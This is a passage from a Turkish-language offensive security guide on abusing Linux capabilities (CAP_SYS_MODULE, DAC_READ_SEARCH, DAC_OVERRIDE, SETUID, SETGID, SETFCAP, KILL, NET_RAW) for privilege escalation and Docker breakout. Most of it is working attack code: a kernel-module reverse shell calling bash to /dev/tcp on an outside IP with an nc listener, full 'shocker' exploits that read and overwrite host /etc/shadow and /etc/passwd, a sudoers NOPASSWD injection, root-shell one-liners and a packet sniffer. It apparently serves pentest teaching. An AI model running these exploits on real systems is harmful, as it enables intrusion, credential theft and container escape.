Bundan yararlanmak için sahte bir **lib/modules** klasörü oluşturalım:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Ardından, aşağıda bulabileceğiniz 2 örnekten kernel module'ü derleyin ve bu klasöre kopyalayın:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Son olarak, bu kernel module'u yüklemek için gerekli Python kodunu çalıştırın:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Binary ile Örnek 2**

Aşağıdaki örnekte **`kmod`** binary'si bu capability'ye sahiptir.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Bu, bir kernel module eklemek için **`insmod`** komutunun kullanılabileceği anlamına gelir. Bu ayrıcalığı kötüye kullanarak bir **reverse shell** elde etmek için aşağıdaki örneği takip edin.

**Environment ile örnek (Docker breakout)**

Docker container içindeki etkin capabilities değerlerini şu komutu kullanarak kontrol edebilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda **SYS_MODULE** capability'sinin etkin olduğunu görebilirsiniz.<sup>[[14]](#references)</sup>

Bir reverse shell çalıştıracak **kernel module**'ü ve bunu **compile** etmek için **Makefile**'ı **oluşturun**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile'daki her make kelimesinden önceki boş karakter **boşluk değil, tab olmalıdır**!

Derlemek için `make` komutunu çalıştırın.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Son olarak, bir shell içinde `nc`'yi başlatın ve başka bir shell'den **modülü yükleyin**; böylece nc process'i içindeki shell'i yakalayacaksınız:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **sitesindeki "Abusing SYS_MODULE Capability" laboratuvarından kopyalanmıştır.**<sup>[[1]](#references)</sup>

Bu tekniğin başka bir örneği [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) adresinde bulunabilir.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir process'in **dosyaları okuma ve dizinleri okuma ve çalıştırma izinlerini bypass etmesini** sağlar. Temel kullanım amacı dosya arama veya okuma işlemleridir. Bununla birlikte, bir process'in process'in mount namespace'i dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilen `open_by_handle_at(2)` işlevini kullanmasına da izin verir. `open_by_handle_at(2)` içinde kullanılan handle'ın `name_to_handle_at(2)` aracılığıyla elde edilen, transparent olmayan bir identifier olması gerekir; ancak inode numaraları gibi tampering'e karşı vulnerable hassas bilgiler içerebilir. Bu capability'nin, özellikle Docker container'ları bağlamındaki exploitation potansiyeli, Sebastian Krahmer tarafından shocker exploit'i ile gösterilmiş ve [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.<sup>[[12]](#references)[[13]](#references)</sup>
**Bu, dosya okuma permission kontrollerini ve dizin okuma/çalıştırma permission kontrollerini bypass edebileceğiniz anlamına gelir**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Binary, kendi namespace'lerinde erişilebilir olan dosyaları okuyabilir. Dolayısıyla `tar` gibi bir dosyada bu capability varsa shadow dosyasını okuyabilir:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 ile örnek**

Bu durumda **`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım. Root dosyalarını listelemek için şunu çalıştırabilirsiniz:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Ve bir dosyayı okumak için şunları yapabilirsiniz:
```python
print(open("/etc/shadow", "r").read())
```
**Ortamda Örnek (Docker breakout)**

Docker container içinde etkin capabilities'leri `capsh --print` kullanarak kontrol edebilirsiniz.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda **DAC_READ_SEARCH** capability'sinin etkin olduğunu görebilirsiniz. Bu, DAC okuma/arama kontrollerini bypass eder ve `open_by_handle_at(2)` kullanımına izin verir; tek başına bir process-debugging capability'si değildir.<sup>[[14]](#references)</sup>

Aşağıdaki exploit'in nasıl çalıştığını [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) adresinden öğrenebilirsiniz; kısaca **CAP_DAC_READ_SEARCH**, permission kontrolleri olmadan file system üzerinde gezinmeye izin verir ve `open_by_handle_at(2)` kullanımını mümkün kılar; bu da ilgili namespace'lere ve mount'lara erişilebildiğinde diğer process'ler tarafından açılmış dosyaları açığa çıkarabilir.<sup>[[13]](#references)[[14]](#references)</sup>

Host'tan dosya okumak için bu permission'ları abuse eden orijinal exploit'i burada bulabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); aşağıdaki ise okunacak dosyayı ilk argüman olarak vermenize ve sonucu bir dosyaya dump etmenize olanak tanıyan **modified version**'dır.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit, host üzerinde mount edilmiş bir şeye işaretçi bulmalıdır. Orijinal exploit `/.dockerinit` dosyasını kullanıyordu; bu değiştirilmiş sürüm ise `/etc/hostname` kullanıyor. Exploit çalışmıyorsa farklı bir dosya belirtmeniz gerekebilir. Host üzerinde mount edilmiş bir dosya bulmak için yalnızca `mount` komutunu çalıştırın:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit, host üzerinde mount edilmiş bir şeye işaretçi bulmalıdır. Orijinal exploit /.dockerinit dosyasını kullanıyordu ve bu değiştirilmiş sürüm ise...](<../../images/image (407) (1).png>)

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "Abusing DAC_READ_SEARCH Capability" laboratuvarından kopyalanmıştır.**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Bu capability, dosya okuma, yazma ve çalıştırma izin kontrollerini atlar.**<sup>[[14]](#references)</sup>

Ayrıcalıklı bir gruba üyelik sayesinde okunabilir veya yazılabilir hâle gelen dosyaları arayın; kullanılabilecek hedefler, hedefin sahipliğine ve mode bitlerine bağlıdır.<sup>[[14]](#references)</sup>

**İkili dosya örneği**

Bu örnekte vim bu capability'ye sahiptir; bu nedenle _passwd_, _sudoers_ veya _shadow_ gibi herhangi bir dosyayı değiştirebilirsiniz:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**2 binary'siyle örnek**

Bu örnekte **`python`** binary'si bu capability'ye sahip olacaktır. Herhangi bir dosyanın üzerine yazmak için python'u kullanabilirsiniz:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**CAP_DAC_READ_SEARCH ortamı ile örnek (Docker breakout)**

Önceki `CAP_DAC_READ_SEARCH` ortam örneğinde gösterildiği gibi `capsh --print` ile `CAP_DAC_OVERRIDE` özelliğini doğrulayın.<sup>[[14]](#references)[[26]](#references)</sup>

İlk olarak, host üzerindeki [**arbitrary files okumak için DAC_READ_SEARCH capability'sini abuse eden**](linux-capabilities.md#cap_dac_read_search) önceki bölümü okuyun ve **exploit'i compile edin**.\
Ardından, host dosya sistemi içinde **arbitrary files yazmanıza** olanak sağlayacak **shocker exploit'inin aşağıdaki sürümünü compile edin**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker container'dan **kaçmak** için host üzerindeki `/etc/shadow` ve `/etc/passwd` dosyalarını **indirebilir**, bunlara **yeni bir kullanıcı** **ekleyebilir** ve üzerlerine yazmak için **`shocker_write`** kullanabilirsiniz. Ardından **ssh** üzerinden **erişim** sağlayabilirsiniz.

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **sitesindeki "Abusing DAC_OVERRIDE Capability" laboratuvarından kopyalanmıştır.**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Bu capability, bir process'in dosyaların sahipliğini değiştirmesine olanak tanır**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

**`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım; **`shadow`** gibi bir dosyanın sahibini değiştirebilir, ardından diğer permissions izin veriyorsa dosyayı değiştirmek için elde edilen erişimi kullanabilirsiniz:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Veya bu capability'e sahip **`ruby`** binary'siyle:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Bu capability, izinleri değiştirme de dahil olmak üzere birçok dosya işlemi için sahiplik kontrollerini bypass eder**.<sup>[[14]](#references)</sup>

**İkili dosya ile örnek**

Python bu capability'ye sahipse shadow dosyasının izinlerini değiştirebilir, **root parolasını değiştirebilir** ve ayrıcalıkları yükseltebilirsiniz:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Bu capability, kernel tarafından uygulanan kimlik bilgisi ve capability kurallarına tabi olarak bir process'in effective user ID'sini değiştirmesine izin verir**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Python bu **capability**'ye sahipse, root'a privilege escalation yapmak için bunu çok kolay bir şekilde abuse edebilirsiniz:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Başka bir yol:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Bu capability, kernel tarafından uygulanan kimlik bilgisi ve capability kurallarına tabi olarak bir process'in effective group ID'sini değiştirmesine olanak tanır**.<sup>[[14]](#references)</sup>

**Privilege escalation için üzerine yazabileceğiniz** birçok dosya vardır; [**buradan fikir edinebilirsiniz**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Binary ile örnek**

Bu durumda, herhangi bir group'u taklit edebileceğiniz için bir group'un okuyabildiği ilginç dosyaları aramalısınız:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Ayrıcalıkları yükseltmek için kötüye kullanabileceğiniz (okuma veya yazma yoluyla) bir dosya bulduktan sonra, **ilginç grubun kimliğine bürünen bir shell elde edebilirsiniz**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Bu durumda `shadow` grubunun kimliğine bürünüldü; böylece `/etc/shadow` dosyasını okuyabilirsiniz:
```bash
cat /etc/shadow
```
### Birleşik zincir: CAP_SETGID + CAP_CHOWN

Her iki capability de aynı helper içinde mevcut olduğunda, pratik bir zincir şu şekildedir:

1. EGID'yi `shadow` (veya başka bir ayrıcalıklı grup) olarak değiştirin.
2. Grup `shadow` olarak kalırken UID'nizi ayarlamak için `/etc/shadow` üzerinde `chown` kullanın.
3. Hedef hash'i okuyun ve crack/pivot yapın.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Bu, doğrudan tam root erişimine ihtiyaç duyulmasını önler ve credential reuse üzerinden pivot yapmak için genellikle yeterlidir.

**docker** kuruluysa **docker group**'unu **impersonate** edebilir ve [**docker socket** ile iletişim kurup ayrıcalıkları yükseltmek](#writable-docker-socket) için bunu kötüye kullanabilirsiniz.

## CAP_SETFCAP

**Bu capability, bir process'in file capabilities ayarlamasına olanak tanır**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Python'da bu **capability** varsa, bunu kötüye kullanarak ayrıcalıkları çok kolay bir şekilde root'a yükseltebilirsiniz:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Yeni yazılan bir file capability kümesi, önceki kümeyi değiştirir; helper daha sonra yalnızca yeni capabilities ile çalıştırılırsa başka bir file'ı güncellemek için `CAP_SETFCAP` yetkisini artık korumayabilir.<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid) elde ettikten sonra ayrıcalıkları nasıl yükselteceğinizi görmek için ilgili bölümüne gidebilirsiniz.

**Environment ile örnek (Docker breakout)**

Docker'ın belgelenmiş varsayılan capability kümesi **CAP_SETFCAP** içerir, ancak gerçek küme runtime yapılandırmasına bağlıdır.<sup>[[19]](#references)</sup>
Process capabilities'lerini şu komutla inceleyebilirsiniz:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Bu capability, file capabilities yazılmasına olanak tanır; ancak tek başına bu capabilities'leri mevcut process'e vermez veya file çalıştırıldığında uygulanan file, bounding-set ve namespace kurallarını bypass etmez.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Dosyanın izin verilen capabilities'leri process'in capability bounding set'i tarafından sınırlandırılır ve dosyanın effective biti, dosyanın permitted set'inin process'in effective set'ine yükseltilip yükseltilmeyeceğini kontrol eder. Bu nedenle bir dosyaya capabilities eklemek, istenen her capability'nin execution time sırasında otomatik olarak kullanılabilir hale gelmesini sağlamaz.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `/dev/mem`, `/dev/kmem` veya `/proc/kcore` erişimi, `mmap_min_addr` değiştirme, `ioperm(2)` ve `iopl(2)` system call'larına erişim ve çeşitli disk komutları dahil olmak üzere birçok hassas işlem sağlar. [Geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara neden olan `FIBMAP ioctl(2)` de bu capability aracılığıyla etkinleştirilir. Man page'e göre bu, sahibinin diğer cihazlarda cihaza özgü çeşitli işlemleri gerçekleştirmesine de olanak tanır.<sup>[[14]](#references)</sup>

Bu, **privilege escalation** ve **Docker breakout** için kullanılabilir.<sup>[[14]](#references)</sup>

## CAP_KILL

**Bu capability, kernel tarafından tanımlanan durumlarda process'lere signal gönderirken permission check'lerini atlar**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

**`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım. **Bir service veya socket configuration** dosyasını (ya da bir service ile ilgili herhangi bir configuration dosyasını) değiştirebilirseniz, dosyaya bir backdoor yerleştirebilir, ardından o service ile ilgili process'i kill edebilir ve yeni configuration dosyasının backdoor'unuz ile execution edilmesini bekleyebilirsiniz.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Eğer kill capabilities'e sahipseniz ve **root olarak çalışan bir node programı** (veya farklı bir kullanıcı olarak çalışan) varsa, muhtemelen ona **SIGUSR1 sinyalini gönderebilir** ve **node debugger'ını açmasını** sağlayabilirsiniz; böylece bağlanabilirsiniz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Bu capability, 1024'ün altındaki Internet portlarına bind etmeye izin verir.** Daha geniş kapsamlı privilege escalation yetkisi doğrudan vermez.<sup>[[14]](#references)</sup>

**binary ile örnek**

**`python`** bu capability'ye sahipse herhangi bir portu dinleyebilir ve hatta o porttan başka herhangi bir porta bağlanabilir (bazı servisler belirli privilege seviyelerindeki portlardan bağlantı gerektirir)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html), süreçlerin **RAW ve PACKET socket'leri oluşturmasına** izin vererek rastgele network paketleri oluşturmalarını ve göndermelerini sağlar. Bu durum containerized ortamlarda paket spoofing, traffic injection ve network access controls mekanizmalarını bypass etme gibi security risklerine yol açabilir. Kötü niyetli kişiler, özellikle yeterli firewall koruması bulunmadığında, container routing mekanizmasına müdahale etmek veya host network security güvenliğini tehlikeye atmak için bundan yararlanabilir. Ayrıca **CAP_NET_RAW**, RAW ICMP istekleri aracılığıyla ping gibi işlemleri destekler.<sup>[[14]](#references)</sup>

**Bu, uygun bir socket interface ile packet capture yapılmasını sağlayabilir.** Daha geniş kapsamlı bir privilege escalation yetkisini doğrudan vermez.<sup>[[14]](#references)</sup>

**binary ile örnek**

**`tcpdump`** binary'si bu capability'ye sahipse network bilgilerini capture etmek için kullanabilirsiniz.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Eğer **environment** bu capability'yi veriyorsa, **`tcpdump`** bunu traffic sniff etmek için de kullanabilir.<sup>[[14]](#references)</sup>

**binary 2 ile örnek**

Aşağıdaki örnek, "**lo**" (**localhost**) interface'inin trafiğini yakalamak için yararlı olabilecek **`python2`** kodudur. Kod, [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) adresindeki "_The Basics: CAP-NET_BIND + NET_RAW_" lab'ından alınmıştır.<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
